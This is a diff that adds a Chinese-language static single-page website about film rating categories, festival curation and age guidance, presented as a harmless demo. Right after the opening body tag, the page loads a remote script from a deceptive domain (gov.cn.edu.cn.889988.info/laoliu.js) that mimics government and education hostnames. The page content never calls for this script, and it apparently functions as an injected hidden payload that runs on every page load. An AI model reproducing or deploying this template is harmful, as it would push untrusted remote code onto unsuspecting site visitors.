@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>限像电影网 - 电影分级档案 / 影展策展 / 适龄提示</title>
+<meta name="description" content="限像电影网（xianxiangdianyingwang-h5）做电影分级知识、影展策展与适龄提示，静态示例单页，不提供在线播放与下载。" />
+<meta name="keywords" content="限像电影网, xianxiangdianyingwang-h5, 电影分级, 普护辅限, 影展策展, 适龄提示, 文艺电影" />
+<link rel="canonical" href="https://xianxiangdianyingwang-h5.github.io/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="限像电影网" />
+<meta property="og:url" content="https://xianxiangdianyingwang-h5.github.io/" />
+<meta property="og:description" content="电影分级档案、影展策展、适龄提示——静态示例站。" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="限像电影网" />
+<meta name="twitter:description" content="xianxiangdianyingwang-h5 电影分级与影展策展单页。" />
+<style>
+:root{
+  --ink:#1b1b1f;
+  --ink2:#26262c;
+  --paper:#f4efe2;
+  --paper2:#e9e1cf;
+  --red:#b23a48;
+  --red2:#d98a92;
+  --muted:#8c8675;
+  --line:rgba(178,58,72,.28);
+  --line2:rgba(244,239,226,.18);
+  --radius:12px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;color:var(--paper);background:var(--ink);line-height:1.85}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+.site-header{position:sticky;top:0;z-index:50;background:rgba(27,27,31,.94);border-bottom:2px solid var(--red)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:66px}
+.brand{display:flex;align-items:center;gap:12px}
+.brand .stamp{width:42px;height:42px;border-radius:8px;background:var(--paper);color:var(--red);display:grid;place-items:center;font-weight:900;border:2px solid var(--red);transform:rotate(-6deg)}
+.brand .txt b{font-size:17px}
+.brand .txt span{font-size:11px;color:var(--muted)}
+.menu{display:flex;gap:4px;font-size:14px}
+.menu a{padding:9px 15px;border-radius:20px;transition:.3s}
+.menu a:hover{background:var(--red);color:#fff}
+.hamburger{display:none;background:none;border:1px solid var(--red);color:var(--red);border-radius:8px;padding:8px 12px;font-size:17px}
+
+.hero{padding:48px 0 36px;background:
+  radial-gradient(560px 280px at 90% 0%,rgba(178,58,72,.18),transparent 60%),
+  radial-gradient(460px 240px at 0% 30%,rgba(244,239,226,.08),transparent 55%)}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:30px;align-items:center}
+.hero h1{font-size:clamp(28px,5vw,44px);margin:0 0 12px;line-height:1.14}
+.hero h1 em{font-style:normal;color:var(--red2)}
+.hero p{font-size:15px;color:#d8d2c4;max-width:520px;margin:0 0 22px}
+.actions{display:flex;gap:10px;flex-wrap:wrap}
+.btn{padding:12px 22px;border-radius:24px;font-weight:700;font-size:14px;border:2px solid var(--red);background:var(--red);color:#fff;cursor:pointer;transition:.3s}
+.btn:hover{background:transparent;color:var(--red2)}
+.btn-outline{background:transparent;color:var(--red2);border-color:var(--red2)}
+.btn-outline:hover{background:var(--red2);color:var(--ink)}
+
+/* archive card */
+.archive{background:var(--paper);color:var(--ink);border-radius:14px;padding:22px;box-shadow:0 18px 50px rgba(0,0,0,.4);position:relative;overflow:hidden}
+.archive::before{content:"限像档案馆";position:absolute;right:-30px;top:-18px;font-size:64px;font-weight:900;color:rgba(178,58,72,.08);transform:rotate(-12deg)}
+.archive h3{margin:0 0 10px;font-size:16px}
+.archive .row{display:flex;justify-content:space-between;gap:10px;padding:9px 0;border-bottom:1px dashed rgba(27,27,31,.18);font-size:13px}
+.archive .row:last-child{border-bottom:none}
+.archive .row b{color:var(--red)}
+
+.section{padding:48px 0}
+.section-alt{background:linear-gradient(180deg,var(--ink2),var(--ink))}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:24px}
+.sec-title{display:flex;align-items:center;gap:12px}
+.sec-title .dot{width:14px;height:14px;border-radius:50%;background:var(--red);box-shadow:0 0 0 4px rgba(178,58,72,.18)}
+.sec-title h2{font-size:clamp(20px,3.2vw,28px);margin:0}
+.sec-title p{margin:2px 0 0;color:var(--muted);font-size:13px}
+.tag{font-size:11px;color:var(--red2);border:1px solid var(--red);padding:4px 12px;border-radius:20px}
+
+/* rating grid */
+.rating-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.rating{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--ink2);text-align:center;transition:.3s}
+.rating:hover{transform:translateY(-5px);border-color:var(--red2)}
+.rating .seal{width:54px;height:54px;margin:0 auto 12px;border-radius:50%;display:grid;place-items:center;font-weight:900;font-size:18px;color:#fff;background:var(--red);border:3px double var(--paper)}
+.rating h3{margin:0 0 4px;font-size:15px;color:var(--paper)}
+.rating p{margin:0;font-size:12px;color:#cfc9bb}
+
+/* programme */
+.prog{display:grid;gap:14px}
+.prog-row{display:grid;grid-template-columns:90px 1fr auto;gap:18px;align-items:center;padding:16px 20px;border:1px solid var(--line2);border-radius:14px;background:var(--ink2);transition:.3s}
+.prog-row:hover{border-color:var(--red);transform:translateX(4px)}
+.prog-row .age{flex:0 0 auto;width:54px;height:54px;border-radius:50%;display:grid;place-items:center;font-weight:800;font-size:13px;color:#fff;background:#3a3a42}
+.prog-row .age.p{background:#3f7d56}
+.prog-row .age.g{background:#3a6ea5}
+.prog-row .age.pg{background:#b08a2e}
+.prog-row .age.r{background:var(--red)}
+.prog-row h3{margin:0 0 3px;font-size:16px}
+.prog-row .meta{font-size:12px;color:var(--muted)}
+.prog-row .unit{font-size:12px;font-weight:700;color:var(--red2);border:1px solid var(--line);padding:5px 10px;border-radius:18px;white-space:nowrap}
+
+/* timeline */
+.timeline{position:relative;margin:0 auto;max-width:760px;padding-left:26px}
+.timeline::before{content:"";position:absolute;left:7px;top:0;bottom:0;width:2px;background:var(--line)}
+.tl-item{position:relative;padding:0 0 22px 22px}
+.tl-item::before{content:"";position:absolute;left:-22px;top:6px;width:14px;height:14px;border-radius:50%;background:var(--red);border:3px solid var(--ink)}
+.tl-item .date{font-size:12px;color:var(--muted)}
+.tl-item h3{margin:3px 0 4px;font-size:15px;color:var(--paper)}
+.tl-item p{margin:0;font-size:13px;color:#cfc9bb}
+
+/* age lock */
+.agegrid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.agebox{border:1px solid var(--line);border-radius:14px;padding:20px;text-align:center;background:var(--ink2)}
+.agebox .num{font-size:30px;font-weight:900;color:var(--red2)}
+.agebox h4{margin:6px 0 4px;font-size:14px}
+.agebox p{margin:0;font-size:12px;color:var(--muted)}
+
+/* about */
+.about-row{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.about-box{padding:24px;border:1px solid var(--line2);border-radius:14px;background:var(--ink2);text-align:center}
+.about-box .ico{font-size:30px;margin-bottom:10px}
+.about-box h3{margin:0 0 6px;font-size:15px;color:var(--red2)}
+.about-box p{margin:0;font-size:12px;color:#cfc9bb;line-height:1.7}
+
+/* faq */
+.faq-box{border:1px solid var(--line2);border-radius:14px;overflow:hidden;background:var(--ink2)}
+.faq-line{border-bottom:1px solid var(--line2)}
+.faq-line:last-child{border-bottom:none}
+.faq-line summary{padding:18px 20px;font-weight:600;cursor:pointer;list-style:none;display:flex;justify-content:space-between;align-items:center}
+.faq-line summary::-webkit-details-marker{display:none}
+.faq-line summary .plus{color:var(--red);font-size:22px;font-weight:300}
+.faq-line[open] summary .plus{transform:rotate(45deg)}
+.faq-line p{padding:0 20px 18px;margin:0;font-size:13px;color:#cfc9bb;line-height:1.8}
+
+.footer{padding:44px 0 26px;background:#101013;color:#8c8675;font-size:13px;margin-top:42px}
+.foot-wrap{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px;margin-bottom:24px}
+.foot-brand{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.foot-brand .stamp{width:34px;height:34px;border-radius:8px;background:var(--paper);color:var(--red);display:grid;place-items:center;font-weight:900;border:2px solid var(--red);transform:rotate(-6deg)}
+.foot-brand b{font-size:15px;color:#fff}
+.foot-wrap p{max-width:280px;margin:0;line-height:1.7}
+.foot-col h4{color:#fff;margin:0 0 10px;font-size:14px}
+.foot-col a{display:block;padding:3px 0;color:#7c7868;transition:.3s}
+.foot-col a:hover{color:var(--red2)}
+.foot-bottom{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;padding-top:18px;border-top:1px solid rgba(255,255,255,.08)}
+
+@media(max-width:1024px){
+  .hero-grid{grid-template-columns:1fr}
+  .rating-grid,.agegrid{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:768px){
+  .menu{position:absolute;top:66px;left:0;right:0;flex-direction:column;background:var(--ink);border-bottom:2px solid var(--red);display:none}
+  .menu.show{display:flex}
+  .menu a{padding:13px 20px;border-bottom:1px solid var(--line2)}
+  .hamburger{display:inline-block}
+  .prog-row{grid-template-columns:54px 1fr}
+  .prog-row .unit{grid-column:2}
+  .about-row,.rating-grid,.agegrid{grid-template-columns:1fr}
+  .foot-wrap{grid-template-columns:1fr 1fr;gap:20px}
+}
+@media(max-width:480px){
+  .foot-wrap{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="#top"><span class="stamp">限像</span><span class="txt"><b>限像电影网</b><span>xianxiangdianyingwang-h5.github.io</span></span></a>
+    <nav class="menu" id="menu">
+      <a href="#rating">分级档案</a>
+      <a href="#today">今日策展</a>
+      <a href="#age">适龄提示</a>
+      <a href="#timeline">影展时间轴</a>
+      <a href="#about">关于我们</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <button class="hamburger" id="navBtn">☰</button>
+  </div>
+</header>
+
+<main id="top">
+  <section class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <h1>不是“限制级入口”，<br>是<em>电影分级档案馆</em></h1>
+        <p>限像电影网把“普 / 护 / 辅 / 限”做成策展语言：哪些片子适合全家、哪些要家长陪同、哪些仅作电影史与分级知识讨论。不播片、不解析、不下载。</p>
+        <div class="actions">
+          <a class="btn" href="#rating">看分级档案</a>
+          <a class="btn btn-outline" href="#age">读适龄提示</a>
+        </div>
+      </div>
+      <aside class="archive">
+        <h3>档案柜 · 当日借阅</h3>
+        <div class="row"><span>普遍级</span><b>全家可看</b></div>
+        <div class="row"><span>保护级</span><b>6+ 陪看</b></div>
+        <div class="row"><span>辅导级</span><b>12+ / 15+</b></div>
+        <div class="row"><span>限制级</span><b>18+ 仅知识讨论</b></div>
+        <div class="row"><span>片源状态</span><b>无 / 示例站</b></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="rating">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>分级档案</h2><p>分级 ≠ 色情，分级是观影建议</p></div></div>
+        <span class="tag">RATING</span>
+      </div>
+      <div class="rating-grid">
+        <div class="rating"><div class="seal">普</div><h3>普遍级</h3><p>一般观众皆可观赏；无强烈暴力、裸露、恐怖或不良诱导。</p></div>
+        <div class="rating"><div class="seal">护</div><h3>保护级</h3><p>低龄儿童不宜单独看，建议父母、师长或成年亲友陪伴辅导。</p></div>
+        <div class="rating"><div class="seal">辅</div><h3>辅导级</h3><p>12+ / 15+ 分区；涉及成长、战争、社会议题，需观众有基本理解力。</p></div>
+        <div class="rating"><div class="seal">限</div><h3>限制级</h3><p>18+ 仅作电影史、审查史、分级制度知识讨论；本站不提供限制级实片。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="today">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>今日策展</h2><p>每部片都标适龄章</p></div></div>
+        <span class="tag">TODAY</span>
+      </div>
+      <div class="prog">
+        <div class="prog-row"><div class="age p">全年龄</div><div><h3>龙猫</h3><div class="meta">1988 · 宫崎骏 · 童年、森林、毛茸茸的想象</div></div><div class="unit">家庭单元</div></div>
+        <div class="prog-row"><div class="age g">6+</div><div><h3>海底总动员</h3><div class="meta">2003 · 皮克斯 · 父子、海洋、勇气</div></div><div class="unit">亲子陪看</div></div>
+        <div class="prog-row"><div class="age pg">12+</div><div><h3>穿条纹睡衣的男孩</h3><div class="meta">2008 · 战争 / 儿童视角 / 需家长引导</div></div><div class="unit">历史教育</div></div>
+        <div class="prog-row"><div class="age pg">15+</div><div><h3>美丽人生</h3><div class="meta">1997 · 喜剧外壳下的集中营寓言</div></div><div class="unit">二战影展</div></div>
+        <div class="prog-row"><div class="age r">18+</div><div><h3>限制级影片（知识案例）</h3><div class="meta">仅用于电影分级 / 审查史讲解，不播放、不下载、不跳转外站</div></div><div class="unit">分级档案</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="age">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>适龄提示</h2><p>年龄锁是保护，不是噱头</p></div></div>
+        <span class="tag">AGE LOCK</span>
+      </div>
+      <div class="agegrid">
+        <div class="agebox"><div class="num">0+</div><h4>全家场</h4><p>动画、自然、音乐、轻喜剧。</p></div>
+        <div class="agebox"><div class="num">6+</div><h4>陪看场</h4><p>轻度惊险、成长烦恼、奇幻冒险。</p></div>
+        <div class="agebox"><div class="num">12+</div><h4>引导场</h4><p>校园、战争儿童视角、社会议题入门。</p></div>
+        <div class="agebox"><div class="num">18+</div><h4>成人场</h4><p>仅电影史 / 分级制度 / 审查史讨论，无实片。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="timeline">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>影展时间轴</h2><p>从家庭动画走到电影审查史</p></div></div>
+        <span class="tag">STRAND</span>
+      </div>
+      <div class="timeline">
+        <div class="tl-item"><div class="date">第一周</div><h3>毛茸茸宇宙</h3><p>龙猫、怪兽电力公司、机器人总动员——动画里的孤独与温柔。</p></div>
+        <div class="tl-item"><div class="date">第二周</div><h3>少年与战争</h3><p>穿条纹睡衣的男孩、再见孩子们、乔乔兔——用孩子眼睛看历史。</p></div>
+        <div class="tl-item"><div class="date">第三周</div><h3>城市夜与作者</h3><p>重庆森林、花样年华、罗马——空间、记忆、没说出口的话。</p></div>
+        <div class="tl-item"><div class="date">第四周</div><h3>分级与审查史</h3><p>从“普护辅限”讲到各国电检制度；限制级只做档案，不放片。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>关于我们</h2><p>静态示例站声明</p></div></div>
+        <span class="tag">ABOUT</span>
+      </div>
+      <div class="about-row">
+        <div class="about-box"><div class="ico">🗂️</div><h3>站点定位</h3><p>限像电影网是“电影分级 + 影展策展”静态示例站，部署于 GitHub Pages，不含后端。</p></div>
+        <div class="about-box"><div class="ico">🎬</div><h3>页面结构</h3><p>单文件 index.html，CSS/JS 内联；含分级档案、今日策展、适龄提示、影展时间轴、关于我们、常见问题。</p></div>
+        <div class="about-box"><div class="ico">⚖️</div><h3>合规边界</h3><p>不提供未授权播放/解析/下载；18+ 限制级仅作电影史与分级知识说明。[9](@ref)</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="faq">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>常见问题</h2><p>把“限级”这件事说清楚</p></div></div>
+        <span class="tag">FAQ</span>
+      </div>
+      <div class="faq-box">
+        <details class="faq-line" open><summary>“限像”是不是“限制级电影”站？<span class="plus">+</span></summary><p>不是。限像 = 限制意象 / 分级档案 / 策展语言。站里不播限制级实片，只讲分级制度与电影史。</p></details>
+        <details class="faq-line"><summary>为什么页面里有 18+ 卡片？<span class="plus">+</span></summary><p>用于说明“限制级”在电影分级中的含义（如港台/海外制度里未满 18 岁不得观赏），属于知识卡片，不是入口。[1,6](@ref)</p></details>
+        <details class="faq-line"><summary>能在线看《穿条纹睡衣的男孩》吗？<span class="plus">+</span></summary><p>不能。所有片名、导演、年级都是示例；正片请走院线、正版流媒体或电影节展映。</p></details>
+        <details class="faq-line"><summary>GitHub Pages 放这种站合规吗？<span class="plus">+</span></summary><p>纯分级知识 / 片单 / 影评风险低；一旦挂未授权播放器、解析接口、网盘合集，就可能被下架并涉及著作权责任。</p></details>
+        <details class="faq-line"><summary>中国大陆有电影分级吗？<span class="plus">+</span></summary><p>中国大陆实行电影审查与公映许可制度，不实行“普护辅限”式分级；本页分级内容主要用于电影史与国际制度科普。[9](@ref)</p></details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="foot-wrap">
+      <div><div class="foot-brand"><span class="stamp">限像</span><b>限像电影网</b></div><p>电影分级档案与影展策展示例站：普 / 护 / 辅 / 限 只做知识，不提供任何真实影视资源。</p></div>
+      <div class="foot-col"><h4>栏目</h4><a href="#rating">分级档案</a><a href="#today">今日策展</a><a href="#age">适龄提示</a><a href="#timeline">影展时间轴</a></div>
+      <div class="foot-col"><h4>信息</h4><a href="#about">关于我们</a><a href="#faq">常见问题</a></div>
+      <div class="foot-col"><h4>链接</h4><a href="#">首页</a><a href="#">隐私政策</a><a href="#">版权声明</a></div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2024 限像电影网 · https://xianxiangdianyingwang-h5.github.io</span>
+      <span>静态示例模板 · 片名/导演/分级均为示例数据 · 不提供在线播放与下载</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('navBtn'),menu=document.getElementById('menu');
+  if(btn&&menu){
+    btn.addEventListener('click',function(){var o=menu.classList.toggle('show');btn.setAttribute('aria-expanded',o?'true':'false');});
+    menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('show');});});
+  }
+})();
+</script>
+</body>
+</html>
